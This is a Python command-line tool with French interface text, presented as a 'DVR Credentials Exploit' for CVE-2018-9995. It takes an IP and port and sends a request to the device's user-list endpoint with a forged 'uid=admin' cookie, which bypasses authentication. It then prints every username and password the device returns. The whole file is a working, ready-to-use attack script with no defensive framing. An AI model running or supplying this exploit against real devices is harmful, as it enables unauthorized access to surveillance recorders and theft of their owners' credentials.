# -*- coding: utf-8 -*-

# ─────────── Imports ───────────
import json
import requests
import shutil
import time
import os
import sys

# ─────────── Couleurs ANSI 256 ───────────
PURPLE_LIGHT  = '\033[38;5;177m'
PURPLE_NORMAL = '\033[38;5;129m'
WHITE         = '\033[38;5;15m'
GREEN         = '\033[38;5;46m'
RED           = '\033[38;5;196m'
YELLOW        = '\033[38;5;226m'
RESET         = '\033[0m'
BOLD          = '\033[1m'

# ─────────── ASCII Art ─────────
ASCII_ART = r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                                    ⠀
                         :**+ :::+*@@.                                                       
                 +: @ = =.  :#@@@@@@@@                 :     .=*@@#     -                    
    @@@@-. :=: +@@.:% *=@@:   @@@@@@          :#=::     .:@=@@@@@@@@@@@@@@@@@@@@--.-:        
.#@@@@@@@@@@@@@@@@@@:# .@@   #@@    :@-     +@@:@@@+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*      
#*   :%@@@@@@@@@@:   .@@#*              ..  ##@ *#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-:- %=       
      *@@@@@@@@@@@@%@@@@@@@            = @=+@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@+   #.      
      #@@@@@@@@@##@@@@@= =#              #@@@#@@@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@=          
     @@@@@@@@@@@#+#@@=                 :@@@-.#-*#@.  .@@.=%@@@@%@@@@@@@@@@@@@@@@@=  +        
    :@@@@@@@@@@@@@@:                   :@@    # - @@@@@@@ =@@@*#*@@@@@@@@@@@@@=.=-  #:       
     :@@@@@@@@@@@+                     @@@@@@@: :    @@@@@@@@@@@@@@@@@@@@@@@@@@@             
      #@@@@@    @                     #%@@@@@@@@@@@@@@@@@:@@@@@@@@@@@@#@@@@@@@@@:            
        @@@     .                    @@@@@@@@@@@@@@@@-%@@@%@#   @@@@@@#=@#@@@@@==            
        =@@##@   =:*.                @@@@@@*@@@@@@@@@@-=@@@@.    +@@@:  %#@@#=   :           
            .=@.                     #@@@@@@@@#@@@@@@@@+#:        %@      *%@=              
               . @@@@@@               @#@@*@@@@@@@@@@@@@@@=        :-     -       =.         
                :@@@@@@@#=                   @@@@@@@@@@@@-               :+%  .@=            
               -@@@@@@@@@@@@                 @+@@@@*+@@#                   @. @@.#   # :     
                @@@@@@@@@@@@@@@               @@@@@*@@@                     :=.        @@@.  
                 @@@@@@@@@@@@@                #@@@@@@%@.                             :  :    
                  *@@@@@@@@@@%               :@@@@@@@@@ @@.                      .@@@@=:@    
                   :@@@@@@@@@                 #@@@@@@   @:                    .#@@@@@@@@@@   
                   :@@@@%@@                   .@@@@@-   .                     @@@@@@@@@@@@*  
                   :@@@@%@@                    *@@@-                          @@@@@@@@@@@@  
                   :@@@@%@@                                                        =@@@:    @=
                    =@@                                                              =    #+ 
                     @%                                                                        
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀                              ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""
# ─── Utilitaires console ──────────────────────────────────────────────
def clear_screen() -> None:
    os.system('cls' if os.name == 'nt' else 'clear')

def print_ascii_art():
    width = shutil.get_terminal_size((80, 20)).columns
    for line in ASCII_ART.strip('\n').splitlines():
        padding = max((width - len(line)) // 2, 0)
        print(' ' * padding + PURPLE_NORMAL + line + RESET)
        time.sleep(0.025)

def make_req_headers() -> dict:
    return {"User-Agent": "Mozilla/5.0", "Cookie": "uid=admin"}

# ─── Bloc utilisateur ─────────────────────────────────────────────────
def print_user_block(user: dict, idx: int) -> None:
    header = f"{PURPLE_LIGHT}{BOLD}┌───────────────── [DVR Credentials Exploit] ─────────────────┐{RESET}"
    footer = f"{PURPLE_LIGHT}{BOLD}└─────────────────────────────────────────────────────────────┘{RESET}"
    print(header)
    print(f"{PURPLE_LIGHT}├─ {WHITE}[{PURPLE_LIGHT}+{WHITE}]{PURPLE_LIGHT} Username : {WHITE}{user.get('uid', '')}{RESET}")
    print(f"{PURPLE_LIGHT}├─ {WHITE}[{PURPLE_LIGHT}+{WHITE}]{PURPLE_LIGHT} Password : {WHITE}{user.get('pwd', '')}{RESET}")
    print(f"{PURPLE_LIGHT}├─ {WHITE}[{PURPLE_LIGHT}+{WHITE}]{PURPLE_LIGHT} ID       : {WHITE}{idx}{RESET}")
    print(footer)

# ─── Boucle principale ───────────────────────────────────────────────
def run() -> None:
    clear_screen()
    print_ascii_art()
    print(f"{PURPLE_LIGHT}===== DVR Credentials Exploit - Tapez 'q' ou 'quit' pour quitter ====={RESET}\n")

    while True:
        cible = input(f"{PURPLE_LIGHT}[DVR Credentials Exploit] -{WHITE} Entrez l'adresse IP et port{RESET} (<ip>:<port>, port par défaut 80) : ").strip()
        if cible.lower() in ('q', 'quit'):
            print(f"{PURPLE_LIGHT}[Info]{WHITE} - Retour au menu principal...{RESET}")
            break

        # Découpage IP / port
        ip, port = (cible.split(':', 1) + ['80'])[:2] if ':' in cible else (cible, '80')
        url = f"http://{ip}:{port}/device.rsp?opt=user&cmd=list"
        print(f"{PURPLE_LIGHT}[DVR Credentials Exploit] - {WHITE}Envoi de la requête à :{RESET} {url}")

        # Requête HTTP
        try:
            resp = requests.get(url, headers=make_req_headers(), timeout=10)
            resp.raise_for_status()
            data = resp.json()
        except requests.exceptions.RequestException as e:
            print(f"{RED}[Erreur HTTP] : {e}{RESET}\n")
            continue
        except json.JSONDecodeError:
            print(f"{RED}[Erreur] Réponse non JSON ou mal formée.{RESET}\n")
            continue

        users = data.get("list", [])
        if not users:
            print(f"{YELLOW}[Info]{RESET} Aucun utilisateur trouvé ou réponse vide.\n")
            continue

        print(f"{PURPLE_LIGHT}[DVR Credentials Exploit] - {WHITE}Exploit sucessfuly executed !{RESET} ({len(users)} Users/Passwd found !) - [CVE-2018-9995]\n")

        for idx, user in enumerate(users, start=1):
            print_user_block(user, idx)
        print()

# ─── Lancement ────────────────────────────────────────────────────────
if __name__ == "__main__":
    try:
        run()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[Info]{RESET} Interruption utilisateur. Retour au menu principal...")
        sys.exit(0)

# Thanks to Fernandez Ezequiel ( twitter:@capitan_alfa ) for the exploit code
# This script is a simple DVR credentials exploit for devices vulnerable to CVE-2018-9995.
# It retrieves user credentials from a vulnerable DVR device by sending a crafted HTTP request.